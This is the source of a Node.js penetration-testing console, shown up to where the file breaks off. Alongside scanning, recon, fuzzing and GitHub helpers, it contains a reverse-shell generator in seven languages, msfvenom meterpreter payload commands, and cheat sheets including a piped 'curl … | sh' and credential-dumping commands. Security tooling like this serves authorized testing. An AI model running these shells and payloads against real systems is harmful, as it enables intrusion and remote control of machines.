#!/usr/bin/env node
"use strict";
/*!
 * Sentinel — Terminal Edition
 * A dependency-free CLI/TUI security console for Windows and Linux.
 * Uses only Node.js built-ins. MIT License. Copyright (c) 2026 Sentinel.
 * Use only on systems you own or are explicitly authorized to test.
 */
const net = require("net");
const tls = require("tls");
const http = require("http");
const https = require("https");
const { execFile, spawn } = require("child_process");
const crypto = require("crypto");
const readline = require("readline");
const os = require("os");
const dnsp = require("dns").promises;
const VERSION = "2.25.0";

// ---------- colors ----------
const useColor = process.stdout.isTTY && !process.env.NO_COLOR;
const A = { reset: "\x1b[0m", b: "\x1b[1m", dim: "\x1b[2m", cyan: "\x1b[36m", green: "\x1b[32m", red: "\x1b[31m", yellow: "\x1b[33m", mag: "\x1b[35m", gray: "\x1b[90m", blue: "\x1b[34m" };
const p = (code, s) => (useColor ? code + s + A.reset : s);
const cyan = (s) => p(A.cyan, s), green = (s) => p(A.green, s), red = (s) => p(A.red, s), yellow = (s) => p(A.yellow, s), gray = (s) => p(A.gray, s), bold = (s) => p(A.b, s), mag = (s) => p(A.mag, s);

// ---------- data ----------
const SERVICES = { 21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp", 53: "dns", 80: "http", 110: "pop3", 111: "rpcbind", 135: "msrpc", 139: "netbios", 143: "imap", 161: "snmp", 389: "ldap", 443: "https", 445: "smb", 465: "smtps", 587: "smtp", 636: "ldaps", 993: "imaps", 995: "pop3s", 1433: "mssql", 1521: "oracle", 2049: "nfs", 2375: "docker", 3306: "mysql", 3389: "rdp", 4444: "metasploit", 5432: "postgres", 5601: "kibana", 5900: "vnc", 5985: "winrm", 6379: "redis", 8000: "http-alt", 8080: "http-proxy", 8443: "https-alt", 8888: "http-alt", 9200: "elastic", 11211: "memcached", 27017: "mongodb" };
const TOP_PORTS = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 161, 389, 443, 445, 465, 587, 636, 993, 995, 1433, 1521, 2049, 2375, 3306, 3389, 4444, 5432, 5601, 5900, 5985, 6379, 8000, 8080, 8443, 8888, 9200, 11211, 27017];

const SHELLS = {
  bash: (i, o) => `bash -i >& /dev/tcp/${i}/${o} 0>&1`,
  python3: (i, o) => `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${i}",${o}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/sh")'`,
  nc: (i, o) => `nc -e /bin/sh ${i} ${o}`,
  "nc-mkfifo": (i, o) => `rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${i} ${o} >/tmp/f`,
  php: (i, o) => `php -r '$s=fsockopen("${i}",${o});exec("/bin/sh -i <&3 >&3 2>&3");'`,
  perl: (i, o) => `perl -e 'use Socket;$i="${i}";$p=${o};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'`,
  powershell: (i, o) => `powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('${i}',${o});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($k=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$k);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)}"`,
};

const CHEATS = {
  "nmap": ["nmap -sV -sC -oN scan.txt TARGET", "nmap -p- --min-rate 5000 -T4 TARGET", "nmap --script vuln TARGET"],
  "shells": ["bash -i >& /dev/tcp/IP/PORT 0>&1", "nc -lvnp 4444   # listener", "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'   # upgrade TTY"],
  "privesc": ["find / -perm -4000 -type f 2>/dev/null   # SUID", "sudo -l", "cat /etc/crontab", "curl -L .../linpeas.sh | sh"],
  "transfer": ["python3 -m http.server 8000", "curl http://IP:8000/f -o f", "wget http://IP:8000/f"],
  "web": ["gobuster dir -u http://TARGET -w common.txt", "ffuf -u http://TARGET/FUZZ -w list.txt", "sqlmap -u 'http://TARGET/?id=1' --batch --dbs"],
  "cracking": ["hashcat -m 0 hash.txt rockyou.txt", "john --wordlist=rockyou.txt hash.txt", "hydra -L users -P rockyou.txt ssh://TARGET"],
  "windows": ["evil-winrm -i TARGET -u USER -p PASS", "impacket-secretsdump DOM/USER:PASS@TARGET", "crackmapexec smb TARGET"],
};

const TOOLS = [
  ["nmap", "Recon", "sudo apt install -y nmap"],
  ["masscan", "Recon", "sudo apt install -y masscan"],
  ["gobuster", "Web", "sudo apt install -y gobuster"],
  ["ffuf", "Web", "sudo apt install -y ffuf"],
  ["nuclei", "Web", "go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"],
  ["sqlmap", "Web", "sudo apt install -y sqlmap"],
  ["hydra", "Passwords", "sudo apt install -y hydra"],
  ["hashcat", "Passwords", "sudo apt install -y hashcat"],
  ["john", "Passwords", "sudo apt install -y john"],
  ["metasploit", "Exploit", "sudo apt install -y metasploit-framework"],
  ["impacket", "Post-ex", "pipx install impacket"],
  ["crackmapexec", "Post-ex", "pipx install crackmapexec"],
];

// ---------- helpers ----------
function banner() {
  const art = [
    "  ███████╗███████╗███╗   ██╗████████╗██╗███╗   ██╗███████╗██╗     ",
    "  ██╔════╝██╔════╝████╗  ██║╚══██╔══╝██║████╗  ██║██╔════╝██║     ",
    "  ███████╗█████╗  ██╔██╗ ██║   ██║   ██║██╔██╗ ██║█████╗  ██║     ",
    "  ╚════██║██╔══╝  ██║╚██╗██║   ██║   ██║██║╚██╗██║██╔══╝  ██║     ",
    "  ███████║███████╗██║ ╚████║   ██║   ██║██║ ╚████║███████╗███████╗",
    "  ╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚═╝╚═╝  ╚═══╝╚══════╝╚══════╝",
  ];
  const tint = [cyan, cyan, (s) => p(A.blue, s), (s) => p(A.blue, s), mag, mag];
  console.log("");
  art.forEach((l, i) => console.log(bold(tint[i](l))));
  console.log("  " + gray("┌─ ") + bold("security console") + gray(" · terminal edition ─ ") + mag("v" + VERSION) + gray(" ─ ") + gray(os.platform() + "/" + os.arch()));
  console.log("  " + gray("└─ use only on systems you own or are authorized to test."));
}
const rl = () => readline.createInterface({ input: process.stdin, output: process.stdout });
function ask(q) { return new Promise((res) => { const r = rl(); r.question(cyan("  " + q + " "), (a) => { r.close(); res(a.trim()); }); }); }
function h1(t) { console.log("\n  " + bold(cyan("▌ " + t)) + "\n"); }
function ok(s) { return green("✓ ") + s; }
function copyHint(cmd) { console.log("  " + cmd); }

// ---------- port scanner ----------
function scan(host, ports, timeout = 900, conc = 250) {
  return new Promise((resolve) => {
    const open = []; let idx = 0, done = 0;
    const total = ports.length;
    const tick = () => { if (process.stdout.isTTY) { readline.clearLine(process.stdout, 0); readline.cursorTo(process.stdout, 0); process.stdout.write("  " + gray(`scanned ${done}/${total} · ${open.length} open`)); } };
    const probe = (port) => new Promise((r) => {
      const s = new net.Socket(); let fin = false, banner = "";
      const end = (isOpen) => { if (fin) return; fin = true; try { s.destroy(); } catch (_) {}
        if (isOpen) { open.push(port); if (process.stdout.isTTY) { readline.clearLine(process.stdout, 0); readline.cursorTo(process.stdout, 0); } console.log("  " + green(String(port).padEnd(7)) + (SERVICES[port] || "").padEnd(12) + gray(banner.slice(0, 60))); }
        r(); };
      s.setTimeout(timeout);
      s.once("connect", () => { s.once("data", (d) => { banner = d.toString("utf8").replace(/[^\x20-\x7e]/g, " ").trim(); end(true); }); setTimeout(() => end(true), 150); });
      s.once("timeout", () => end(false));
      s.once("error", () => end(false));
      try { s.connect(port, host); } catch (_) { end(false); }
    });
    const worker = async () => { while (true) { const i = idx++; if (i >= total) return; await probe(ports[i]); done++; tick(); } };
    console.log("  " + gray(`PORT   SERVICE     BANNER`));
    Promise.all(Array.from({ length: Math.min(conc, total) }, worker)).then(() => {
      if (process.stdout.isTTY) { readline.clearLine(process.stdout, 0); readline.cursorTo(process.stdout, 0); }
      console.log("  " + ok(`${open.length} open port${open.length === 1 ? "" : "s"} on ${host}`));
      if (open.length) console.log("  " + gray("nmap: ") + `nmap -sV -sC -p ${open.join(",")} ${host}`);
      resolve(open);
    });
  });
}
function parsePorts(spec) {
  if (!spec || spec === "top") return TOP_PORTS;
  const m = spec.match(/^(\d+)-(\d+)$/);
  if (m) { const a = []; for (let i = +m[1]; i <= +m[2]; i++) a.push(i); return a; }
  return spec.split(",").map(Number).filter((n) => n > 0 && n < 65536);
}

// ---------- encoders / hashes ----------
const ENC = {
  b64e: (s) => Buffer.from(s, "utf8").toString("base64"),
  b64d: (s) => Buffer.from(s, "base64").toString("utf8"),
  hexe: (s) => Buffer.from(s, "utf8").toString("hex"),
  hexd: (s) => Buffer.from(s, "hex").toString("utf8"),
  urle: (s) => encodeURIComponent(s),
  urld: (s) => decodeURIComponent(s),
};
function hashes(s) { return ["md5", "sha1", "sha256", "sha512"].map((a) => "  " + a.padEnd(8) + cyan(crypto.createHash(a).update(s).digest("hex"))).join("\n"); }
function idHash(h) {
  h = h.trim();
  if (/^\$2[aby]\$/.test(h)) return "bcrypt";
  if (/^\$6\$/.test(h)) return "sha512crypt"; if (/^\$1\$/.test(h)) return "md5crypt";
  if (/^[a-f0-9]{32}$/i.test(h)) return "MD5 or NTLM (-m 0 / -m 1000)";
  if (/^[a-f0-9]{40}$/i.test(h)) return "SHA-1 (-m 100)";
  if (/^[a-f0-9]{64}$/i.test(h)) return "SHA-256 (-m 1400)";
  if (/^[a-f0-9]{128}$/i.test(h)) return "SHA-512 (-m 1700)";
  return "unknown";
}

// ---------- recon: DNS / WHOIS / headers ----------
async function dnsLookup(host) {
  host = host.replace(/^https?:\/\//, "").split("/")[0];
  const kinds = [["A", "resolve4"], ["AAAA", "resolve6"], ["MX", "resolveMx"], ["NS", "resolveNs"], ["TXT", "resolveTxt"], ["CNAME", "resolveCname"]];
  const out = [];
  for (const [label, fn] of kinds) { try { for (const v of (await dnsp[fn](host)) || []) out.push([label, label === "MX" ? v.priority + " " + v.exchange : Array.isArray(v) ? v.join("") : v]); } catch (_) {} }
  try { const a = await dnsp.resolve4(host); if (a[0]) for (const ptr of (await dnsp.reverse(a[0]).catch(() => [])) || []) out.push(["PTR", ptr]); } catch (_) {}
  return out;
}
function whoisAsk(server, query) {
  return new Promise((res) => { const s = net.connect(43, server); let data = ""; s.setTimeout(9000);
    s.on("connect", () => s.write(query + "\r\n")); s.on("data", (d) => (data += d.toString()));
    s.on("end", () => res(data)); s.on("timeout", () => { try { s.destroy(); } catch (_) {} res(data); }); s.on("error", () => res(data)); });
}
async function whois(query) {
  query = query.replace(/^https?:\/\//, "").split("/")[0];
  let t = await whoisAsk("whois.iana.org", query);
  const ref = (t.match(/refer:\s*(\S+)/i) || [])[1] || (t.match(/whois:\s*(\S+)/i) || [])[1];
  if (ref) { const m = await whoisAsk(ref, query); if (m && m.trim()) t = m; }
  return t.trim();
}
const SEC = [["strict-transport-security", "HSTS"], ["content-security-policy", "CSP"], ["x-frame-options", "X-Frame-Options"], ["x-content-type-options", "X-Content-Type-Options"], ["referrer-policy", "Referrer-Policy"], ["permissions-policy", "Permissions-Policy"]];
async function headers(url) {
  if (!/^https?:\/\//.test(url)) url = "https://" + url;
  const r = await fetch(url, { redirect: "follow" }).catch((e) => ({ __err: e.message }));
  if (r.__err) return { err: r.__err };
  const h = {}; r.headers.forEach((v, k) => (h[k] = v));
  return { status: r.status, server: h.server || "?", h };
}

function certInspect(host) {
  host = host.replace(/^https?:\/\//, "").split("/")[0];
  return new Promise((res) => {
    let done = false; const fin = (v) => { if (done) return; done = true; res(v); };
    const s = tls.connect({ host, port: 443, servername: host, rejectUnauthorized: false, timeout: 9000 }, () => {
      const c = s.getPeerCertificate(false), flat = (o) => Object.entries(o || {}).map(([k, v]) => k + "=" + v).join(", ");
      fin({ ok: true, protocol: s.getProtocol(), cipher: (s.getCipher() || {}).name, subject: flat(c.subject), issuer: flat(c.issuer), valid_from: c.valid_from, valid_to: c.valid_to, san: (c.subjectaltname || "").replace(/DNS:/g, ""), serial: c.serialNumber, fp: c.fingerprint256, daysLeft: c.valid_to ? Math.round((new Date(c.valid_to) - Date.now()) / 86400000) : null });
      s.end();
    });
    s.on("error", (e) => fin({ ok: false, error: e.message }));
    s.on("timeout", () => { try { s.destroy(); } catch (_) {} fin({ ok: false, error: "timeout" }); });
  });
}
async function subs(domain) {
  domain = domain.replace(/^https?:\/\//, "").split("/")[0].toLowerCase();
  const ctrl = new AbortController(), to = setTimeout(() => ctrl.abort(), 20000);
  try {
    const r = await fetch("https://crt.sh/?q=%25." + encodeURIComponent(domain) + "&output=json", { signal: ctrl.signal, headers: { "User-Agent": "Sentinel" } });
    const txt = await r.text(); let data;
    try { data = JSON.parse(txt); } catch { return { err: "crt.sh is busy — try again in a moment" }; }
    const set = new Set();
    for (const e of data) for (const n of String(e.name_value || "").split("\n")) { const s = n.trim().toLowerCase(); if (s && !s.includes("*") && (s === domain || s.endsWith("." + domain))) set.add(s); }
    return [...set].sort();
  } catch (e) { return { err: e.name === "AbortError" ? "crt.sh timed out" : e.message }; }
  finally { clearTimeout(to); }
}

// ---------- content fuzzer ----------
const COMMON_PATHS = ["admin", "administrator", "login", "logout", "register", "dashboard", "api", "api/v1", "v1", "v2", ".git", ".git/config", ".env", "config", "config.php", "wp-admin", "wp-login.php", "wp-content", "phpmyadmin", "robots.txt", "sitemap.xml", "backup", "backups", "backup.zip", "db", "database", "dump.sql", "test", "dev", "staging", "uploads", "images", "assets", "js", "css", "includes", "tmp", "old", ".htaccess", ".htpasswd", "server-status", "status", "health", "healthz", "metrics", "actuator", "actuator/health", "swagger", "swagger-ui", "api-docs", "graphql", "console", "debug", "info.php", "phpinfo.php", "README.md", "CHANGELOG.md", "LICENSE", ".DS_Store", "web.config", "crossdomain.xml", ".well-known/security.txt", "users", "user", "account", "profile", "settings", "private", "secret", "internal", "portal", "cpanel", "webmail", "mail", "ftp", "git", "svn", ".svn", "vendor", "composer.json", "package.json", "Dockerfile", "docker-compose.yml", ".gitignore", "error_log", "logs", "log"];
function headReq(url, to) {
  return new Promise((res) => {
    let u; try { u = new URL(url); } catch (_) { return res(null); }
    const lib = u.protocol === "https:" ? https : http;
    const req = lib.request(u, { method: "GET", timeout: to || 8000, rejectUnauthorized: false, headers: { "User-Agent": "Sentinel" } }, (r) => { const o = { status: r.statusCode, len: r.headers["content-length"] || "", loc: r.headers["location"] || "" }; r.destroy(); res(o); });
    req.on("timeout", () => { req.destroy(); res(null); });
    req.on("error", () => res(null));
    req.end();
  });
}
async function fuzz(base, wlFile) {
  if (!base) { console.log("  " + red("usage: fuzz <url> [wordlist-file]")); return; }
  if (!/^https?:\/\//i.test(base)) base = "http://" + base;
  base = base.replace(/\/+$/, "");
  let words = COMMON_PATHS;
  if (wlFile) { try { words = require("fs").readFileSync(wlFile, "utf8").split("\n").map((s) => s.trim()).filter(Boolean); } catch (_) { console.log("  " + red("can't read " + wlFile)); return; } }
  console.log("  " + gray("fuzzing " + base + " (" + words.length + " paths)"));
  let idx = 0, found = 0;
  const color = (s) => s < 300 ? green : s < 400 ? cyan : (s === 401 || s === 403) ? yellow : gray;
  const probe = async (w) => { const r = await headReq(base + "/" + w.replace(/^\//, ""), 8000); if (r && r.status && r.status !== 404) { found++; console.log("  " + color(r.status)(String(r.status)) + "  /" + w.replace(/^\//, "") + gray(r.loc ? "  -> " + r.loc : (r.len ? "  " + r.len + "b" : ""))); } };
  const worker = async () => { while (true) { const i = idx++; if (i >= words.length) return; await probe(words[i]); } };
  await Promise.all(Array.from({ length: Math.min(25, words.length) }, worker));
  console.log("  " + ok(found + " path" + (found === 1 ? "" : "s") + " found on " + base));
}

// ---------- CVE search (NVD) ----------
function parseCve(v) {
  const c = v.cve, desc = (c.descriptions.find((d) => d.lang === "en") || c.descriptions[0] || {}).value || "";
  const m = c.metrics || {}, p = m.cvssMetricV31 || m.cvssMetricV30 || m.cvssMetricV2;
  const score = p && p[0] ? p[0].cvssData.baseScore : "", sev = p && p[0] ? (p[0].cvssData.baseSeverity || p[0].baseSeverity || "") : "";
  return { id: c.id, desc, score, sev, published: (c.published || "").slice(0, 10) };
}
async function cveSearch(q) {
  q = (q || "").trim();
  if (!q) { console.log("  " + red("usage: cve <keyword or CVE-id>")); return; }
  const isId = /^CVE-\d{4}-\d+$/i.test(q);
  const url = "https://services.nvd.nist.gov/rest/json/cves/2.0?" + (isId ? "cveId=" + q.toUpperCase() : "keywordSearch=" + encodeURIComponent(q)) + "&resultsPerPage=15";
  console.log("  " + gray("searching NVD..."));
  const r = await fetch(url, { headers: { "User-Agent": "Sentinel" } }).catch((e) => ({ __err: e.message }));
  if (r.__err) { console.log("  " + red(r.__err)); return; }
  if (!r.ok) { console.log("  " + red(r.status + (r.status === 403 ? " — NVD rate limit, wait a moment" : " " + r.statusText))); return; }
  const d = await r.json();
  if (!d.vulnerabilities || !d.vulnerabilities.length) { console.log("  " + gray("no results")); return; }
  console.log("  " + gray(d.totalResults + " total, showing " + Math.min(15, d.vulnerabilities.length)));
  d.vulnerabilities.slice(0, 15).forEach((v) => { const c = parseCve(v); const tag = c.score ? " [" + c.sev + " " + c.score + "]" : ""; console.log("  " + cyan(c.id) + yellow(tag) + " " + c.desc.slice(0, 78)); });
}

// ---------- GitHub (system git + token) ----------
function sh(args, opts) { return new Promise((res) => execFile("git", args, { maxBuffer: 1e7, ...opts }, (err, stdout, stderr) => res({ err, stdout, stderr }))); }
const ghToken = () => process.env.SENTINEL_GH_TOKEN || process.env.GITHUB_TOKEN || "";
const ghAuth = (url, t) => (t && /^https:\/\//i.test(url)) ? url.replace(/^https:\/\//i, "https://" + t + "@") : url;
const ghScrub = (s, t) => String(s || "").split(t || " __none__").join("***").trim();
async function gitClone(url) {
  if (!/^https:\/\//i.test(url)) { console.log("  " + red("use an https repo URL")); return; }
  const t = ghToken(), name = (url.split("/").pop() || "repo").replace(/\.git$/, "");
  console.log("  " + gray("cloning " + name + "..."));
  const r = await sh(["clone", ghAuth(url, t), name]);
  if (r.err) { console.log("  " + red(ghScrub(r.stderr || r.err.message, t))); return; }
  await sh(["-C", name, "remote", "set-url", "origin", url]);
  console.log("  " + ok("cloned into ./" + name));
}
async function gitPush(msg) {
  const t = ghToken();
  await sh(["add", "-A"]);
  await sh(["-c", "user.name=Sentinel", "-c", "user.email=sentinel@local", "commit", "-m", msg || "Update via Sentinel"]);
  const remote = (await sh(["remote", "get-url", "origin"])).stdout.trim();
  const branch = (await sh(["rev-parse", "--abbrev-ref", "HEAD"])).stdout.trim();
  const p = await sh(["push", ghAuth(remote, t), "HEAD:" + branch]);
  console.log("  " + (p.err ? red(ghScrub(p.stderr || p.err.message, t)) : ok("pushed to " + branch)));
}
async function gitStatus() { const r = await sh(["status", "--short", "-b"]); console.log((r.stdout || r.stderr || "").trim().split("\n").map((l) => "  " + l).join("\n")); }
async function gitPull() {
  const t = ghToken(), remote = (await sh(["remote", "get-url", "origin"])).stdout.trim();
  const r = await sh(["pull", ghAuth(remote, t)]);
  console.log("  " + (r.err ? red(ghScrub(r.stderr || r.err.message, t)) : ok("pulled\n  " + (r.stdout || "").trim())));
}
async function ghApiJson(path, method, body) {
  const t = ghToken();
  const opt = { method: method || "GET", headers: { Accept: "application/vnd.github+json", "User-Agent": "Sentinel" } };
  if (t) opt.headers.Authorization = "Bearer " + t;
  if (body) { opt.body = JSON.stringify(body); opt.headers["Content-Type"] = "application/json"; }
  const r = await fetch("https://api.github.com" + path, opt).catch((e) => ({ __err: e.message }));
  if (r.__err) return { err: r.__err };
  if (!r.ok) return { err: r.status + " " + r.statusText };
  return { data: await r.json() };
}
async function gitBranches() { const r = await sh(["branch", "-a"]); console.log((r.stdout || r.stderr || "").replace(/^/gm, "  ").trimEnd()); }
async function gitLog() { const r = await sh(["log", "--oneline", "-20", "--no-color"]); console.log((r.stdout || r.stderr || "no commits").replace(/^/gm, "  ").trimEnd()); }
async function gitDiff(file) { const r = await sh(file ? ["diff", "--no-color", "--", file] : ["diff", "--no-color"]); const t = (r.stdout || "").trimEnd(); console.log(t ? t : "  " + gray("no working-tree changes")); }
async function ghNewIssue(repo, title, body) {
  if (!repo || !repo.includes("/") || !title) { console.log("  " + red('usage: git issue <owner/repo> "title" ["body"]')); return; }
  const r = await ghApiJson("/repos/" + repo + "/issues", "POST", { title, body: body || "" });
  if (r.err) { console.log("  " + red(r.err)); return; }
  console.log("  " + ok("created #" + r.data.number) + " " + gray(r.data.html_url));
}
async function ghNewPR(title, base) {
  const remote = (await sh(["remote", "get-url", "origin"])).stdout.trim();
  const m = remote.match(/github\.com[:/]([^/]+\/[^/.]+?)(?:\.git)?$/i), repo = m && m[1];
  if (!repo) { console.log("  " + red("no github remote")); return; }
  if (!title) { console.log("  " + red('usage: git pr "title" [base]')); return; }
  const head = (await sh(["rev-parse", "--abbrev-ref", "HEAD"])).stdout.trim();
  if (!base) { const ri = await ghApiJson("/repos/" + repo); base = (ri.data && ri.data.default_branch) || "main"; }
  if (head === base) { console.log("  " + red("on base branch (" + base + ") — checkout a feature branch first")); return; }
  const r = await ghApiJson("/repos/" + repo + "/pulls", "POST", { title, head, base, body: "" });
  if (r.err) { console.log("  " + red(r.err)); return; }
  console.log("  " + ok("created PR #" + r.data.number) + " " + gray(r.data.html_url));
}
async function ghComment(repo, num, body) {
  if (!repo || !repo.includes("/") || !num || !body) { console.log("  " + red('usage: git comment <owner/repo> <number> "text"')); return; }
  const r = await ghApiJson("/repos/" + repo + "/issues/" + num + "/comments", "POST", { body });
  if (r.err) { console.log("  " + red(r.err)); return; }
  console.log("  " + ok("commented on #" + num) + " " + gray(r.data.html_url));
}
async function ghGists() {
  const r = await ghApiJson("/gists?per_page=30");
  if (r.err) { console.log("  " + red(r.err)); return; }
  if (!r.data.length) { console.log("  " + gray("no gists")); return; }
  r.data.forEach((g) => console.log("  " + (g.public ? gray("public") : yellow("secret")) + " " + (Object.keys(g.files)[0] || "gist") + gray("  " + g.html_url)));
}
async function ghNewGist(file, desc) {
  if (!file) { console.log("  " + red("usage: git gist <file> [description]")); return; }
  let content; try { content = require("fs").readFileSync(file, "utf8"); } catch (_) { console.log("  " + red("can't read " + file)); return; }
  const name = file.split(/[\\/]/).pop();
  const r = await ghApiJson("/gists", "POST", { description: desc || "", public: true, files: { [name]: { content } } });
  if (r.err) { console.log("  " + red(r.err)); return; }
  console.log("  " + ok("gist created") + " " + gray(r.data.html_url));
}
async function gitCheckout(name) {
  if (!name) { console.log("  " + red("usage: git checkout <branch>")); return; }
  const r = await sh(["checkout", name]);
  console.log("  " + (r.err ? red((r.stderr || r.err.message).trim()) : ok("switched to " + name)));
}
async function ghIssues(repo, kind) {
  if (!repo || !repo.includes("/")) { console.log("  " + red("usage: git " + (kind === "pulls" ? "prs" : "issues") + " <owner/repo>")); return; }
  const r = await ghApiJson("/repos/" + repo + "/" + (kind === "pulls" ? "pulls" : "issues") + "?state=open&per_page=25");
  if (r.err) { console.log("  " + red(r.err)); return; }
  const items = (kind === "pulls" ? r.data : r.data.filter((x) => !x.pull_request));
  if (!items.length) { console.log("  " + gray("none open")); return; }
  items.forEach((x) => console.log("  " + cyan((kind === "pulls" ? "PR#" : "#") + x.number) + " " + x.title + gray("  @" + (x.user ? x.user.login : "?"))));
}
async function ghReposList() {
  const r = await ghApiJson("/user/repos?sort=updated&per_page=100");
  if (r.err) { console.log("  " + red(r.err)); return; }
  r.data.forEach((x) => console.log("  " + (x.private ? yellow("private") : gray("public ")) + " " + bold(x.full_name) + gray("  " + x.clone_url)));
}
async function ghNewRepo(name) {
  if (!name) { console.log("  " + red("usage: git new <name>")); return; }
  const r = await ghApiJson("/user/repos", "POST", { name, private: true, auto_init: true });
  if (r.err) { console.log("  " + red(r.err)); return; }
  console.log("  " + ok("created " + r.data.full_name) + "\n  " + gray(r.data.clone_url));
}

// ---------- interactive menus ----------
async function menuScan() {
  h1("Port scanner");
  const host = await ask("host / IP:");
  if (!host) return;
  const spec = await ask("ports [top / 1-1024 / 80,443]:") || "top";
  console.log("");
  await scan(host, parsePorts(spec));
}
async function menuDns() {
  h1("DNS lookup");
  const host = await ask("domain:"); if (!host) return;
  console.log("");
  const recs = await dnsLookup(host);
  if (!recs.length) { console.log("  " + red("no records found")); return; }
  recs.forEach(([k, v]) => console.log("  " + cyan(k.padEnd(6)) + v));
}
async function menuWhois() {
  h1("WHOIS");
  const q = await ask("domain / IP:"); if (!q) return;
  console.log("\n  " + gray("querying whois..."));
  const t = await whois(q); console.log("");
  console.log(t.split("\n").slice(0, 60).map((l) => "  " + l).join("\n"));
}
async function menuHeaders() {
  h1("HTTP security headers");
  const url = await ask("url:"); if (!url) return;
  console.log("\n  " + gray("fetching..."));
  const r = await headers(url); console.log("");
  if (r.err) { console.log("  " + red(r.err)); return; }
  console.log("  " + ok(r.status + " · server: " + r.server));
  SEC.forEach(([k, label]) => { const on = r.h[k] !== undefined; console.log("  " + (on ? green("✓") : red("✗")) + " " + label.padEnd(24) + (on ? gray(String(r.h[k]).slice(0, 60)) : gray("missing"))); });
}
async function menuCert() {
  h1("TLS certificate");
  const host = await ask("host:"); if (!host) return;
  console.log("\n  " + gray("connecting..."));
  const c = await certInspect(host); console.log("");
  if (!c.ok) { console.log("  " + red(c.error)); return; }
  const d = c.daysLeft, exp = d == null ? "" : d < 0 ? red("EXPIRED " + -d + "d ago") : d < 21 ? yellow(d + "d left") : green(d + "d left");
  console.log("  " + ok(c.protocol + " · " + c.cipher + "  " + exp));
  [["Subject", c.subject], ["Issuer", c.issuer], ["Valid", c.valid_from + " -> " + c.valid_to], ["SAN", c.san], ["Serial", c.serial], ["SHA-256", c.fp]].forEach(([k, v]) => console.log("  " + cyan(k.padEnd(9)) + gray(String(v))));
}
async function menuSubs() {
  h1("Subdomains · certificate transparency");
  const dom = await ask("domain:"); if (!dom) return;
  console.log("\n  " + gray("querying crt.sh..."));
  const r = await subs(dom); console.log("");
  if (r.err) { console.log("  " + red(r.err)); return; }
  console.log("  " + ok(r.length + " subdomains"));
  r.forEach((s) => console.log("  " + s));
}
async function menuGit() {
  h1("GitHub");
  console.log("  token: " + (ghToken() ? green("set (env)") : red("not set — export SENTINEL_GH_TOKEN=ghp_...")));
  console.log("  actions: clone push pull status log diff branch checkout repos new issues prs issue pr comment gists gist\n");
  const act = await ask("action:");
  console.log("");
  if (act === "clone") { const url = await ask("repo url:"); if (url) { console.log(""); await gitClone(url); } }
  else if (act === "push") { const m = await ask("commit message:"); console.log(""); await gitPush(m); }
  else if (act === "pull") await gitPull();
  else if (act === "status") await gitStatus();
  else if (act === "branch") await gitBranches();
  else if (act === "checkout") { const b = await ask("branch:"); console.log(""); await gitCheckout(b); }
  else if (act === "log") await gitLog();
  else if (act === "diff") await gitDiff();
  else if (act === "issue") { const r = await ask("owner/repo:"); const t = await ask("title:"); console.log(""); await ghNewIssue(r, t); }
  else if (act === "repos") await ghReposList();
  else if (act === "new") { const n = await ask("repo name:"); console.log(""); await ghNewRepo(n); }
  else if (act === "issues") { const r = await ask("owner/repo:"); console.log(""); await ghIssues(r, "issues"); }
  else if (act === "prs") { const r = await ask("owner/repo:"); console.log(""); await ghIssues(r, "pulls"); }
  else if (act === "pr") { const t = await ask("title:"); console.log(""); await ghNewPR(t); }
  else if (act === "comment") { const r = await ask("owner/repo:"); const n = await ask("issue #:"); const t = await ask("comment:"); console.log(""); await ghComment(r, n, t); }
  else if (act === "gists") await ghGists();
  else if (act === "gist") { const f = await ask("file path:"); console.log(""); await ghNewGist(f); }
  else console.log("  " + red("unknown action"));
}
async function menuShell() {
  h1("Reverse shell generator");
  console.log("  langs: " + Object.keys(SHELLS).join(", ") + "\n");
  const lang = (await ask("lang [bash]:")) || "bash";
  const ip = (await ask("LHOST [10.0.0.1]:")) || "10.0.0.1";
  const port = (await ask("LPORT [4444]:")) || "4444";
  console.log("\n  " + (SHELLS[lang] || SHELLS.bash)(ip, port) + "\n");
  console.log("  " + gray("listener: ") + `nc -lvnp ${port}`);
}
async function menuEncode() {
  h1("Encode / decode / hash");
  console.log("  ops: b64e b64d hexe hexd urle urld hash hashid\n");
  const op = await ask("op:");
  const val = await ask("input:");
  console.log("");
  try {
    if (op === "hash") console.log(hashes(val));
    else if (op === "hashid") console.log("  " + cyan(idHash(val)));
    else if (ENC[op]) console.log("  " + cyan(ENC[op](val)));
    else console.log("  " + red("unknown op"));
  } catch (e) { console.log("  " + red("error: " + e.message)); }
}
async function menuPayloads() {
  h1("Payload builders");
  const ip = (await ask("LHOST [10.0.0.1]:")) || "10.0.0.1";
  const port = (await ask("LPORT [4444]:")) || "4444";
  console.log("");
  console.log("  " + gray("linux elf   ") + `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=${ip} LPORT=${port} -f elf -o p.elf`);
  console.log("  " + gray("windows exe ") + `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${ip} LPORT=${port} -f exe -o p.exe`);
  console.log("  " + gray("nc listener ") + `nc -lvnp ${port}`);
  console.log("  " + gray("http server ") + `python3 -m http.server 8000`);
  console.log("  " + gray("msf handler ") + `msfconsole -q -x "use exploit/multi/handler;set payload linux/x64/meterpreter/reverse_tcp;set LHOST ${ip};set LPORT ${port};run"`);
}
async function menuCheats() {
  h1("Cheat sheets");
  console.log("  topics: " + Object.keys(CHEATS).join(", ") + "\n");
  const t = await ask("topic:");
  const lines = CHEATS[t];
  console.log("");
  if (!lines) { console.log("  " + red("no such topic")); return; }
  lines.forEach((l) => console.log("  " + cyan("$ ") + l));
}
function listTools() {
  h1("Tools catalog");
